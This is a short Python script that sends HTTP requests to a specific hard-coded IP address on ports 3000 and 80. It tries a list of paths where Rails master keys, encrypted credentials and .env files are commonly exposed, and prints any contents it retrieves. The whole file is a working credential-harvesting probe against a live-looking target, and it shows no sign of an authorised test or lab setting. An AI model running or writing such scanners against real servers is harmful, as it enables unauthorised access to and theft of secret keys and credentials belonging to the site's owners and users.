#!/usr/bin/env python3
"""Try every possible URL path for master key"""
import urllib.request
import urllib.error

paths = [
    "/config/master.key",
    "/config/credentials.yml.enc",
    "/master.key",
    "/.env",
    "/storage/config/master.key",
    "/app/config/master.key",
    "/api/v1/config/master.key",
    "/assets/config/master.key",
    "/public/config/master.key",
    "/uploads/config/master.key",
    "/system/config/master.key",
]

for path in paths:
    req = urllib.request.Request("http://38.107.234.149:3000" + path)
    try:
        with urllib.request.urlopen(req, timeout=4) as resp:
            body = resp.read().decode(errors="replace")
            print("[3000] {} -> HTTP {} : {}".format(path, resp.getcode(), body[:100].strip()))
    except urllib.error.HTTPError as e:
        if e.code != 404:
            print("[3000] {} -> HTTP {}".format(path, e.code))
    except Exception:
        pass

    req80 = urllib.request.Request("http://38.107.234.149:80" + path)
    try:
        with urllib.request.urlopen(req80, timeout=4) as resp:
            body = resp.read().decode(errors="replace")
            print("[80] {} -> HTTP {} : {}".format(path, resp.getcode(), body[:100].strip()))
    except urllib.error.HTTPError as e:
        if e.code != 404:
            print("[80] {} -> HTTP {}".format(path, e.code))
    except Exception:
        pass

print("\nDone")
